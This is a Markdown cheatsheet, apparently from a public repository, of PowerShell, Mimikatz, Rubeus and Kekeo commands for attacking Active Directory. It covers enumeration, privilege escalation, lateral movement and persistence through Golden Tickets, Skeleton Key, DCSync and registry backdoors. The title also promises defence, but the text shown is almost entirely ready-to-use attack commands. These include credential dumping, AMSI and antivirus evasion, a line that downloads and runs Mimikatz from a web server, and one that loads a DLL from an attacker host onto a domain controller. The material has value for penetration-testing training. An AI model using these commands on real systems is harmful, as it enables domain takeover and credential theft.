invoke# Attacking and Defending Active Directory - A Cheatsheet
A list of commands, tools and notes about enumerating and exploiting Active Directory and how to defend against these attacks.

Massive kudos to the following people that I've taken a lot of this from:

S1ckB0y1337 from the awesome cheatsheet here https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

Nikhal Mittal http://www.labofapenetrationtester.com/ and the course from Pentester Academy.

## Enumeration
This is absolutely key, and you should always come back to this step any time you escalate to a new user or gain access to a new machine.

PowerView makes things a little more easy, but can be picked up by AMSI and therefore might make things a little more noisy in a real engagement if you attempt to bypass this.

### Domain Enumeration
#### PowerView (will need to bypass AMSI)
 - Get Current Domain

`Get-NetDomain`
 - Get information about a different domain

`Get-NetDomain -Domain <DomainName>`
 - Get Domain SID

`Get-DomainSID`
 - Get Domain Controllers

`Get-NetDomainController`

`Get-NetDomainController -Domain <DomainName>`
 - Get Domain Policies

`Get-DomainPolicy`
  - Get Password policy (useful for not locking accounts in a brute force or password spray scenario)

`(Get-DomainPolicy)."system access"`
  - Get Kerberos policy (useful for things like Golden Ticket attacks)

`(Get-DomainPolicy)."kerberos policy"`
 
 #### AD Module
 - Get Current Domain
`Get-ADDomain`
 - Get information about a different domain
`Get-ADDomain -Identity <Domain>`
 - Get Domain SID
`(Get-ADDomain).DomainSID`
 - Get Domain Controllers
`Get-ADDomainController`
 - Get Domain Controllers from a different domain
`Get-ADDomainController -Identity <DomainName>`

### User Enumeration
#### Powerview (will need to bypass AMSI)

 - Show all users
 `Get-NetUser`
  - Show a particular user
 `Get-NetUser -SamAccountName <user>`
 `Get-NetUser -Username <user>`
 `Get-NetUser | select cn`
  - Get a list of all properties for users
 `Get-Userproperty`
 - Show the samaccountname field from all users from a specified domain
`Get-netuser -domain <domainName> | select -expandproperty samaccountname`
 - Show last password change
`Get-UserProperty -Properties pwdlastset`
 - Show logon count of a user (handy for detecting decoy or stale accounts)
`Get-UserProperty -Properties logoncount`
 - Search for a string in a user's attribute
`Find-UserField -SearchField Description -SearchTerm "pass"`
`Find-UserField -SearchField Description -SearchTerm "built"`
 - Find users with sessions on a machine
`Get-NetLoggedon -ComputerName <ComputerName>`
 - Enumerate sessions on a machine
`Get-NetSession -ComputerName <ComputerName>`
 - Enumerate the domain to look for user sessions
`Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName`

#### AD Module
 - Show a user's properties
`Get-ADUser -Identity <user> -Properties *`
 - Search for a string in a user's attribute
`Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description | select Name,Description`

`Get-ADUser -Filter 'Description -ne $null' -Properties Description | select Name,Description`
 - Get a list of all properties for users
`Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name`
 - Show the last password set date for users
`Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}`
 - Show users with password not required attribute set
`Get-ADUser -Filter 'PasswordNotRequired -eq $True' -Properties PasswordNotRequired | select Name,PasswordNotRequired`

### Computer Enumeration
#### Powerview (will need to bypass AMSI)
 - List all computer objects in the domain
`Get-NetComputer -Domain <domainName>`
 - Show all properties of computer objects in the domain
`Get-NetComputer -FullData`
 - Enumerate live machines
`Get-Netcomputer -Ping`
 - Look for stale computer objects
`Get-NetComputer -FullData | select dnshostname,lastlogon`
 - Get actively logged on users on a computer (needs local admin rights on the target)
`Get_NetLoggedOn -ComputerName <computername>`
 - Get locally logged on users on a computer (needs remote registry on the target - this is enabled by default on Server OSes)
`Get-LoggedonLocal -ComputerName <computername>`
 - Get the last logged on user on a computer (needs admin rights and remote registry on the target)
`Get-LastLoggedOn -Computername <computername>`

#### AD Module
 - List all computer objects in the domain
`Get-ADComputer -Filter * | select name`
 - Show all properties of computer objects in the domain
`Get-ADComputer -Filter * -Properties *`
 - List all Server 2016 computer objects
`Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem`
 - Enumerate live machines
`Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`

### Enumerating Groups
#### Powerview (will need to bypass AMSI)
##### Domain Groups
  - Get all groups in the current domain
`Get-NetGroup`
`Get-DomainGroup`
`Get-NetGroup -Domain <targetdomain>`
 - List all groups with admin in the name
`Get-NetGroup *admin*`
`Get-DomainGroup *admin* | select distinguishedname`
 - Get attributes of a group
`Get-NetGroup -GroupName <GroupName> -FullData` 
 - Get group members (**recurse** includes nested group membership)
`Get-NetGroupMember -GroupName "<GroupName>" -Recurse -Domain <DomainName>`
_Built-In Groups are good to check for membership e.g. Remote Desktop Users, Server Operators, Print Operators etc_

 - Domain Admins (members and properties)
`Get-NetGroupMember -GroupName "Domain Admins" -Recurse | select -expandproperty membername`

 - Enterprise Admins (members and properties)
	 - First establish the forest domain name, then query the Enterprise ADmins
`get-netforestdomain -verbose`
`get-netgroupmember -groupname "Enterprise Admins" -domain <forestdomain> -recurse | select -expandproperty membername`
 
 - Get group membership for a user
`Get-NetGroup -Username "<username>"`
##### Local Machine Groups
 - Get local groups on a machine (needs local admin privs)
`Get-NetLocalGroup -ComputerName <computername> -ListGroups`
 - Get members of local groups on a machine (needs local admin privs)
`Get-NetLocalGroup -ComputerName <computername> -Recurse`
 - Find local admins on all machines in the domain (needs admin privileges)
`Invoke-EnumerateLocalAdmin`

#### AD Module
 - Get all groups in the current domains
`Get-ADGroup -Filter * | select Name`
`Get-ADGroup -Filter * -Properties *`
 - List all groups with admin in the name
`Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
 - Get group members (**recursive** includes nested group membership)
`Get-ADGroupMember -Identity "Domain Admins" -Recursive`
 - Get group membership for a user
`Get-ADPrincipalGroupMembership -Identity <username>`
 
### Enumerating Shares
#### Powerview (will need to bypass AMSI)
 - Get all fileservers in the domain (lots of users log into these, lots of creds available if you can compromise a file server, as well as l00t!)
`Get-NetFileServer`
 - Enumerate Domain Shares
`Find-DomainShare`
`Invoke-ShareFinder`
 - Enumerate Domain Shares the current user has access
`Find-DomainShare -CheckShareAccess`
 - Enumerate "Interesting" Files on accessible shares
`Find-InterestingDomainShareFile -Include *passwords*`
`Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose`
`Invoke-FileFinder`
 - Check ACLs for a path
`Get-PathAcl -Path "\\Path\Of\A\Share"`

### Enumerating OUs
#### Powerview (will need to bypass AMSI)
 - To list all the OUs we will use
`Get-NetOU -FullData`
 - To find out what machines are in a particular OU
`Get-NetOU <OUName> | %{Get-NetComputer -ADSPath $_}`
   - List GPOs assigned to an OU
```
(get-netou <OUName> -fulldata).gplink
# Copy the ADSPath
Get-NetGPO -ADSPath '<adspath>'
```

#### AD Module
`Get-ADOrganizationalUnit -Filter * -Properties `


### Enumerating GPOs
It is not possible to enumerate the settings within a GPO from any command line tool. The closest thing is to export RSoP with Get-GPResultantsetOfPolicy.

#### Powerview (will need to bypass AMSI)
 `Get-NetGPO -FullData`
 `Get-NetGPO -GPOname <The GUID of the GPO>`
 `Get-NetGPO | select displayname`
 `Get-NetGPO -ComputerName <computername>`
   - List GPOs assigned to an OU
```
(get-netou <OUName> -fulldata).gplink
# Copy the ADSPath
Get-NetGPO -ADSPath '<adspath>'
```
  - Get GPOs which use Restricted Groups or groups.xml for interesting users (Restricted Groups add domain users to machine local groups via GPO. These can identify attractive targets for compromise.)
 `Get-NetGPOGroup -Verbose`
 - FInd users that are part of a machines's local admins group
 `Find-GPOComputerAdmin -ComputerName <ComputerName>`
  - Get machines where the given user is a member of a specific group
`Find-GPOLocation -UserName <username> -Verbose
 - Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
`Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName`
 - Enumerate GPOs where a specified user or group has interesting permissions
`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}  | ?{$_.IdentityReference -match "<user>"}`

#### Group Policy Module (Only available where RSAT is installed.)
`Get-GPO -All`
 - Get RSoP report
	 - `Get-GPResultantsetOfPolicy -ReportType Html -Path <outfile>`

### Enumerating ACLs
#### Powerview (will need to bypass AMSI)
 - Return the ACLs associated with the specified account
`Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs`
 - Return ACLs with a specified prefix for search
`Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose`
 - Return ACLs for the Domain Admins group
`Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs`
 - Return ACLs for the Users group, just displaying the ActiveDirectoryRights field
`Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs | select -expandproperty IdentityReference ActiveDirectoryRights`
 - Return ACLs the a specific user has rights to
`Get-ObjectACL -ResolveGUIDs | ?{$_.IdentityReference -like "*compromisedusername*"}`
 - Enumerate ACLs for all GPOs
`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`
 - Search for interesting ACEs (looks for anything with write access)
`Invoke-ACLScanner -ResolveGUIDs`
 - Check ACLs for a path
`Get-PathAcl -Path "\\server\path"`
 - Enumerate GPOs where a specified user or group has interesting permissions
`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}  | ?{$_.IdentityReference -match "<user>"}`
 - Check for modify rights/permissions for a specified user or group
`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "<user>"}`

### Enumerating Forests & Trusts
#### Powerview (will need to bypass AMSI)
 - Enumerate all domains in the forest
`Get-NetForestDomain`
`Get-NetForestDomain Forest <ForestName>`
 - Map the Trusts in the forest
`Get-NetForestTrust`
`Get-NetForestTrust -Forest <ForestName>`
`Get-NetDomainTrust`
`Get-NetForestDomain -Verbose | Get-NetDomainTrust`
 - List External Trusts
`Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`
`Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`
`Get-NetDomainTrust -Domain <domainName>`

#### AD Module
 - Enumerate the Domain Trusts
`Get-ADTrust -Filter *`
`Get-ADTrust -Identity <DomainName>`
 - Enumerate Forest trusts
`Get-ADForest`
`Get-ADForest -Identity <ForestName>`
 - List all the domains in the forest
`(Get-ADForest).Domains`

### User Hunting
You can look to see where else your current user has local admin access. This is very noisy.
#### Powerview
 - Find all machines in the current domain where the current user has local admin access
`Find-LocalAdminAccess`
 - The Find-LocalAdminAccess command uses the following command coupled with Get-NetComputer under the hood
`Invoke-CheckLocalAdminAccess`
 
 If RPC an SMB are blocked you can use WMI or PSRemoting 
 - Nishang (https://github.com/samratashok/nishang) has
`Find-PSRemotingLocalAdminAccess`
 - With WMI
`Find-WMILocalAdminAccess`

 - Find computers where a domain admin (or other user/group) has a session (does not require admin privileges to query sessions, but does to find logged on users)
`Invoke-UserHunter`
`Invoke-UserHunter -GroupName "<GroupName>"`
 - Find computers with a domain admin session and then checks to see if the current user has local admin access on that computer
`Invoke-UserHunter -CheckAccess`
 - Find users on high value targets (e.g. Domain Controllers, File Servers) (less noisy)
`Invoke-UserHunter -Stealth`
 - Setup a rolling check for a user logon
`Invoke-UserHunter -ComputerName <targetserver> -Poll 100 -UserName <targetuser> -Delay 5`

 - Find local admins on all machines in the domain (needs admin privileges)
`Invoke-EnumerateLocalAdmin`


### Enumerating Applocker Policy
#### AD Module 
 - Review Local AppLocker Effective Policy
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

## Local Privilege Escalation
Once you've established a connection to a target machine, you may need to escalate to Administrator, or another local user.
Getting Administrative privileges can enable you to do things such as switch off AV, install tools and services, as well as grab credentials from other user's with local sessions straight out of memory. All the good stuff basically.

Things to check:
 - Missing patches
 - Automated deployment or AutoLogon passwords in clear text
 - AlwaysInstallElevated permissions
 - Misconfigured services
 - DLL Hijacking

### PowerUp
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc
`. .\PowerUp.ps1`
There are many more options available inside PowerUp than are listed below. It's advised to read the ReadMe above for the latest information and functions.

*Note - PowerUp and PowerView can conflict so it is not advised to run both modules in the same session.*

#### Running all privilege escalation checks
PowerUp can run through its list of escalation vectors and check if any are possible on the machine
`Invoke-AllChecks`

#### Automatic
PowerUp can also automate the process
`Invoke-PrivEsc`

#### Service misconfiguration abuse
- Find local services that are configured with unquoted whitespace. This weak configuration allows us to inject a malicious process into the path.
`Get-ServiceUnquoted`
 - If we have the permissions to modify a service we can change the path to a malicious executable. PowerUp allows us to easily check for this.
`Get-ModifiableService`
 - The abuse function adds our current user to the local Administrators group. It will also restore the abused service back to its original state to try to avoid detection
`Invoke-ServiceAbuse -Name '<servicename>' -UserName '<usertoescalate>'`
 - Log off and on again to get local admin
 - Check the admin group
`net localgroup Administrators`

### BeRoot
https://github.com/AlessandroZ/BeRoot
 - Run BeRoot.exe

## Lateral Movement
### PowerShell Remoting
PowerShell Remoting needs local admin access, and is enabled by default on Servers.
It can be enabled on workstations using
`Enable-PSRemoting`

#### One-to-One
 - Connect to a server using PowerShell Remoting
`Enter-PSSession <servername>`
 - Create a session for reuse
`$sessionname = New-PSSession <targetserver>`
 - Enter the saved session
`Enter-PSSession $sessionname`
 - Run commands on a remote server
`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName <computer-name>`
 - Run scripts on a remote server (encodes in base64 scriptblock and runs in memory on the target)
`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName <computer-name>`
 - Run locally loaded functions on remote machines
`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name>`
 - Pass **positional** arguments to locally loaded functions on remote machines
`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name> - ArgumentList`
 - Run "Stateful" commands on a remote session
```
# Create a session
$sessionname = New-PSSession <targetserver>
# Execute the command in the session and save to a variable
Invoke-Command -Session $sessionname -ScriptBlock {$Proc = Get-Process}`
# Execute the command variable in the session
Invoke-Command -Session $sessionname -ScriptBlock {$Proc}
# Treat the variable like the route function as required
Invoke-Command -Session $sessionname -ScriptBlock {$Proc.Name}
```

#### One-to-Many (Fan-out)
All of the One-to-One commands can be run in parallel on multiple targets by providing a list.
 - Run commands on a list of servers
`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName (Get-Content <listofservers>`)
 - Run scripts on a list of remote servers
`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName (Get-Content <listofservers>)`

#### Credentials
All of the above commands can have the credentials entered manually when prompted. It can be easier to save these to a variable.
```
$securepassword = ConvertTo-SecureString '<password123>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
Invoke-Command -ComputerName <computer-name> -Credential $Cred -ScriptBlock {whoami}
```
### Lateral Movement with Mimikatz
We can use Mimikatz remotely to extract credentials and do all kinds of other cool stuff.
 - Dump credentials on local machine
`Invoke-Mimikatz`
Or
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
 - Dump credentials on remote machines (uses Invoke-Command in the background)
`Invoke-Mimikatz -ComputerName <computername>`
*Note if you are running this from a reverse shell you will need to setup a New-PSSession to the target machine e.g.*
```
iex (iwr http://<webserver>/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName <targetserver>
Invoke-Command -ScriptBlock {$function:Invoke-Mimikatz} -Session $sess
```
 - On multiple targets
`Invoke-Mimikatz -ComputerName @("sys1", "sys2")`
 - **Over pass the hash** and start a new PowerShell process as the target user
*Needs to be run from an elevated shell*
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'`
*You are now authenticated as the target user, but to run commands on the target server as that user use:*
```
Enter-PSSession <targetserver>
whoami
```

## Persistence
You've reached Domain Admin, let's see if you can stay there in case your entry point gets cleaned up.
	*If you wanna take a swing at the King, you better not miss!*
### Golden Ticket
 - Execute Mimikatz on DC as DA to get krbtgt hash
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <domaincontroller>`
 - Use it
`Invoke-Mimikatz -Command '"kerberos::golden /User:<any-username-youwant> /domain:<domainname> /sid:<domainSID> /krbtgt:<krbtgt-ntlm-hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
/endin and /renewmax parameters are optional, but for good opsec these should match the target domain kerberos policy.
/ptt will use the ticket in the current process, /ticket can be used to save the kerberos ticket to disk.
`lsadump::dcsync` can be used instead of `lsadump::lsa /patch` and can be more silent, although might get picked up by other defences.
 - That gives you DA privileges in the current session. Check by running commands e.g.:
`ls \\<domaincontroller>\c$`
OR
`gwmi -Class win32_computersystem -ComputerName <domaincontroller>`

### Silver Ticket
While technically a Persistence technique, there are circumstances that might present privilege escalation routes.
 - Use Mimikatz to generate a Silver ticket for the CIFS services on a target server.
`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:cifs /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
 - For WMI we need two tickets, for HOST and RPCSS
`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:HOST /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:RPCSS /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
Now you can run WMI commands:
`Get-WmiObject -Class win32_operatingsystem -ComputerName <targetserver>`


### Skeleton Key
The Skeleton Key attack injects a skeleton key password into the DC LSASS process which allows access to any valid user in the domain with the skeleton key password.

 - Inject the Skeleton Key 'mimikatz' using...Mimikatz
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <targetDC>`
This allows you to login as any user with the password 'mimikatz'.

### DSRM
Abusing the DSRM account can give you persistent access to the DC.
 - Dump DSRM password (needs DA privs)
	 - `Enter-PSSession -Session $sess`
	 - *bypass AMSI*
	 - `Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess`
	 - `Enter-PSSession -Session $sess`
	 - `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`
 - Edit the registry on the DC to enable the DSRM account to logon
`New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
 - Pass the hash from your attacker machine to 
`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<targetdchostname> /user:Administrator /ntlm:<ntlmhash>  /run:powershell.exe"'`
 - Access the DC from the attacker machine
`ls \\<targetdc>\c$`

### Custom SSP
This attack is only really much good as a Proof of Concept out of the box, and would require some source code in mimilib.dll editing to store the credentials somewhere that could be reached if used in an engagement.
 - Save the mimilib.dll in the system32 folder on the DC
 - Add it to the Security Packages in the registry
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
This can also be injected into lsass (unstable with Server 2016
`Invoke-Mimikatz -Command '"misc::memssp"'`

### AdminSDHolder
 - Add FullControl permissions for a user to the AdminSDHolder using PowerView
`Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName '<username>' -Rights All`
- Using RACE toolkit (https://github.com/samratashok/RACE):
`Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local'`

### DCSync
 - Check if the user has replication rights (powerview). No output means that it doesn't have the permissions.
`Get-ObjectAcl -DistinguishedName "<domainDN>" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}`
 - Add the rights if you have sufficient access (Domain Admin)
	 - Powerview
`Add-ObjectAcl -TargetDistinguishedName "<domainDN>" -PrincipalSamAccountName <username> -Rights DCSync -Verbose`
	 - AD Module and RACE
`Set-ADACL -SamAccountName <username> -DistinguishedName '<domainDN>' -GUIDRight DCSync`
 - Extract hashes or krbtgt (or any other user) using the DCSync rights and Mimikatz
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

### Security Descriptors
Using the RACE toolkit (https://github.com/samratashok/RACE)
`. .\Set-RemoteWMI.ps1`
 - Grant a user access to WMI on the local computer (requires admin privileges)
`Set-RemoteWMI -SamAccountName <username>`
 - Grant a standard user WMI privileges to access a remote computer (requires admin on the remote server to set the privileges)
`Set-RemoteWMI -UserName <username> -ComputerName <servername> -namespace 'root\cimv2'`
 - Allow access to WMI on remote machine with explicit credentials
`Set-RemoteWMI -SamAccountName <username> -ComputerName <servername> -Credential <Administrator> -namespace 'root\cimv2'`
 - Now view information of the server using WMI as the standard user that was granted access
`gwmi -class win32_operatingsystem -ComputerName <servername>`
 - You can also start a process on the remote server using WMI
`Invoke-WMIMethod -Class win32_process -Name Create -ArgumentList calc.exe -ComputerName <servername>`
 - Remove permissions on remote computer
`Set-RemoteWMI -SamAccountName <username> -ComputerName <servername> -namespace 'root\cimv2' -Remove`
  - Grant user access to PSRemoting on local machine
`. .\Set-RemotePSRemoting.ps1`
*Can show an IO error when run, but this does not mean it was not successful*
`Set-RemotePSRemoting -SamAccountName <username>`
 - Grant user access to PSRemoting on remote machine
`Set-RemotePSRemoting -Username <username> -ComputerName <servername>`
 - Now you can run PowerShell commands on the remote computer
`Invoke-Command -ScriptBlock{whoami} -ComputerName <servername>`
 - Remove the permissions on a remote machine
`Set-RemotePSRemoting -SamAccountName <username> -ComputerName <servername> -Remove`

To abuse the remote permissions and retrieve hashes you can use the DAMP toolkit (part of RACE toolkit)
`. .\DAMP-master\Add-RemoteRegBackdoor.ps1`
 - Add the required registry keys to gain access to the hashes
`Add-RemoteRegbackdoor -ComputerName <servername> -Trustee <username>`
 - As the "Trustee" (low priv user) retrieve the machine account hash in order to use this for a Silver Ticket
Performing this on the remote machine requires the remote registry to be enabled (default on servers)
`. .\DAMP-master\RemoteHashRetrieval.ps1`
`Get-RemoteMachineAccountHash -ComputerName <servername>`
You can work around this if it is disabled using PSRemoting
```
$sess = New-PSSession <servername>
Invoke-Command -FilePath c:\tool\RACE.ps1 -Session $sess
Enter-PSSession $sess
Get-RemoteMachineAccountHash
```
 - Retrieve local account hash
`Get-RemoteLocalAccountHash -ComputerName <servername>`
 - Retrieve domain cached credentials
`Get-RemoteCachedCredential -ComputerName <servername>`

## Privilege Escalation
### Kerberoasting
#### PowerView
 - Find user accounts that are used as kerberos service accounts
`Get-NetUser -SPN`
 - Request a TGS for the service (crack these with John or Hashcat)
`Request-SPNTicket`
#### Active Directory Module
 - Find user accounts that are used as kerberos service accounts
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
 - Request a TGS for the service
`Add-Type -AssemblyNAme System.IdentityModel`
`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
 - Save the ticket to disk
`Invoke-Mimikatz -Command '"kerberos::list /export"'`
 - Brute force using TGSRepCrack
`python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\<ticketname.kirbi>`
 - If you have permissions you can set an SPN with the AD module for targeted Kerberoasting
`Set-ADUser -Identity <targetuser> -ServicePrincipalNames @{Add='whatever/whatever1'`
#### Targeted Kerberoasting using PowerView Dev
 `. .\PowerView_dev.ps1`
 - Enumerate accounts where your user or Group has GenericWrite or GenericAll permissions
`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user/groupname>"}`
 - Force set an SPN (just needs to be string\string no other validation is performed) e.g. fake/service
`Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname='whatever/whateverX'}`
 - Request a TGS for that SPN
`Get-DomainUser -Identity <targetuser> | Get-DomainSPNTicket | select -ExpandProperty Hash`

### AS-REPRoasting
#### PowerView (DEV)
`. .\PowerView_dev.ps1`
 - Enumerate accounts with Kerberos Pre-Auth disabled
`Get-DomainUser -PreauthNotRequired`
 - Enumerate accounts where your user or Group has GenericWrite or GenericAll permissions
`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user/groupname>"}`
 - Force the DoesNotRequirePreAuth attribute
`Set-DomainObject -Identity <targetusername> -XOR @{useraccountcontrol=4194304}`

#### AD Module
 - Enumerate accounts with Kerberos Pre-Auth disabled
`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

#### ASREPRoast Module & John The Ripper
 - Get the AS-REP Hash
`Get-ASREPHash -UserName <username>`
 - Brute Force the hash
`john <hashfile.txt> --wordlist=wordlist.txt`

### Unconstrained Delegation
#### PowerView
 - Find machines that have unconstrained delegation enabled (NB DCs will always show unconstrained delegation as enabled)
`Get-NetComputer -Unconstrained`

#### AD Module
 - Find machines that have unconstrained delegation enabled (NB DCs will always show unconstrained delegation as enabled)
`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
`Get-ADUser -Filter {TrustedForDelegation -eq $True}`

Presuming that we've already have the hash of a user that is an admin on the server that has unconstrained delegation enabled.
 - Over Pass the hash to the server
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<userhash> /run:powershell.exe"'`
 - Setup a PSSession to the target server and load Mimikatz
```
$sess = New-PSSession -ComputerName <targetserver>
Enter-PSSession -Session $sess
# BYPASS AMSI
exit
Invoke-Command -FilePath c:\tools\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
```
 - Extract the tickets and hope for DA (this can be influenced with the printer bug)
`Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
 - If there's a ticket you want to re-use play Pass the ticket with Mimikatz
`Invoke-Mimikatz -Command '"kerberos::ptt c:\path\to\ticket.kirbi"'`

### Printer Bug
 - Copy Rubeus to the compromised server (You will likely need to disable AV)
`Copy-Item -ToSession $sess -Path <source> -Destination <destination>`
- On the compromised server capture the TGT of the connecting server using Rubeus (https://github.com/GhostPack/Rubeus) 
`.\Rubeus.exe monitor /interval:5 /nowrap`
 - Force the connection of the DC to the compromised server using MS-RPRN.exe (https://github.com/leechristensen/SpoolSample)
`.\MS-RPRN.exe \\<targetDC> \\<compromisedserver>`
 - Copy the Base64 encoded ticket of the targetDC, remove spaces and newlines and save the ticket
 - Pass the ticket using Rubeus on the attacker machine
`.\Rubeus.exe ptt /ticket:<TGTofDC>`
 - Once you have access as the DC machine account, run a DCSync to extract any or all users (get KRBTGT and you have Golden Ticket)
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain\useraccounttoretrieve>"'`

### Constrained Delegation
 - Enumerate users and computers with constrained delegation enabled
	 - using PowerView (dev)
`Get-DomainUser -TrustedToAuth`
`Get-DomainComputer -TrustedToAuth`
	 - using AD module
`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
 - Presuming we already have either the plaintext or hash of the password for the user with delegation enabled
	 - use Kekeo to request a TGT for the service
`.\kekeo.exe`
`tgt::ask /user:<userthatcandelegate> /domain:<domain> /rc4:<userhash>`
	- Now request a TGS for the service using a Domain Admin account
`s4u /tgt:<tgt.kirbi> /user:<targetuser>@<targetdomain> /service:<targetSPN>`
	 - We should now have a TGS as the Domain Admin. Use Mimikatz to pass the ticket
`Invoke-Mimikatz -Command '"kerberos::ptt <tgsticket.kirbi>"'`
	 - This gives us DA access to the target service (e.g. CIFS)
`ls \\<targetserver>\c$`
 - Use Rubeus for the same thing
`.\Rubeus.exe s4u /user:<userthatcandelegate> /rc4:<ntlmhash> /impersonateuser:<targetuser> /msdsspn:"<targetSPN>" /ptt`
 - For delegated machine accounts request an alternate service (e.g. ldap/host/rpcss/http) that is running as the same service account that the delegated SPN is
	 - With Kekeo
`tgt::ask /user:<machinethatcandelegate> /domain:<domain> /rc4:<userhash>`
`tgs::s4u /tgt:<tgt.kirbi> /user:<targetuser>@<targetdomain> /service:<delegatedSPN|ldap/targetcomputername>`
`Invoke-Mimikatz -Command '"kerberos::ptt <tgsticket.kirbi>"'`
	 - With Rubeus
`.\Rubeus.exe s4u /user:<machinethatcandelegate> /rc4:<ntlmhash> /impersonateuser:<targetuser> /msdsspn:"<targetSPN>" /altservice:ldap /ptt`
	 - Now we have access as the dcmachine account
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'`

### DNS Admins
 - Enumerate members of the DNSAdmins Group
	 - With Powerview
`Get-NetGroupMember -GroupName "DNSAdmins"`
	 - With AD Module
`Get-ADGroupMember -Identity DNSAdmins`
 - As the user that is in the DNSAdmins group
	 - Using dnscmd.exe (requires RSAT DNS)
`dnscmd <target-dc> /config /serverlevelplugindll \\attackerIP\mimilib.dll`
	 - Using DNSServer module (needs RSAT DNS)
```
$dnsettings = Get-DNSServerSetting -ComputerName <target-dc> -All
$dnsettings.ServerLevelPluginDLL = "\\<attackerIP>\mimilib.dll"
Set-DNSServerSetting -InputObject $dnsettings -ComputerName <target-dc>
```
 - Restart the DNS Service
```
sc \\<target-dc> stop DNS
sc \\<target-dc> start DNS
```

### Trust Tickets
#### Domain Trusts
##### Trust Keys
You can find the RC4 Trust Key for a domain using any of the following commands *It is the in key you generally want e.g. [in] source domain -> target domain
 - `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -computername <domaincontroller>`
 - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain\username>"'`
